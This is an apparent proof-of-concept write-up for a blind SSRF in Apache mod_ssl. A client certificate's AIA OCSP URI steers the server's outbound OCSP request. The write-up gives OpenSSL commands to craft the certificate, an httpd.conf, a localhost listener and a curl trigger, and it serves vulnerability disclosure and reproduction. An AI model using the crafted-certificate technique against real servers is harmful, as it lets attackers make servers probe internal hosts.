# PoC 149 — Certificate-Controlled OCSP Request Host

`mod_ssl` lets the client certificate's AIA OCSP URI choose the outbound
OCSP host when `SSLOCSPOverrideResponder` is off, yielding a blind SSRF
primitive.

## Setup

Generate a CA, a server cert, and a client cert. The client cert's AIA
OCSP URI is the attacker-controlled host `127.0.0.1:9999`:

```bash
mkdir -p /tmp/httpd-poc-149 && cd /tmp/httpd-poc-149
openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
  -subj "/CN=poc149-ca" -keyout ca.key -out ca.crt
openssl req -newkey rsa:2048 -nodes -subj "/CN=localhost" \
  -keyout server.key -out server.csr
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -days 1 -out server.crt
cat > client.cnf <<'EOF'
[req]
distinguished_name = dn
req_extensions = ext
[dn]
CN = poc149-client
[ext]
authorityInfoAccess = OCSP;URI:http://127.0.0.1:9999/ocsp
EOF
openssl req -newkey rsa:2048 -nodes -config client.cnf \
  -keyout client.key -out client.csr
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -days 1 -extfile client.cnf -extensions ext -out client.crt
```

`httpd.conf`:

```apache
ServerRoot "/tmp/httpd-poc-149"
PidFile "/tmp/httpd-poc-149/httpd.pid"
ErrorLog "/tmp/httpd-poc-149/error.log"
LogLevel ssl:debug

Listen 127.0.0.1:8443

LoadModule mpm_event_module  modules/mod_mpm_event.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule ssl_module        modules/mod_ssl.so

SSLEngine on
SSLCertificateFile    /tmp/httpd-poc-149/server.crt
SSLCertificateKeyFile /tmp/httpd-poc-149/server.key
SSLCACertificateFile  /tmp/httpd-poc-149/ca.crt
SSLVerifyClient require
SSLVerifyDepth  2
SSLOCSPEnable on
SSLOCSPOverrideResponder off
```

OCSP-responder honeypot listener:

```bash
python3 - <<'PY' &
import socket
s = socket.socket(); s.bind(("127.0.0.1", 9999)); s.listen(1)
print("waiting for AIA-driven OCSP POST", flush=True)
c, a = s.accept()
print("HIT from", a, flush=True)
print(c.recv(4096).decode(errors='replace'), flush=True)
PY
```

## Trigger

```bash
/usr/sbin/httpd -f /tmp/httpd-poc-149/httpd.conf -k start
curl -k --cert /tmp/httpd-poc-149/client.crt \
        --key  /tmp/httpd-poc-149/client.key \
        https://127.0.0.1:8443/
```

## Observed effect

* The honeypot logs an inbound POST whose `Host:` header equals
  `127.0.0.1:9999` and whose path is `/ocsp` — the certificate-supplied
  AIA URI.
* The TLS handshake later fails, but the outbound HTTP POST has already
  occurred — confirming that certificate AIA data drives outbound traffic
  through `determine_responder_uri()` at
  `modules/ssl/ssl_engine_ocsp.c:159`.
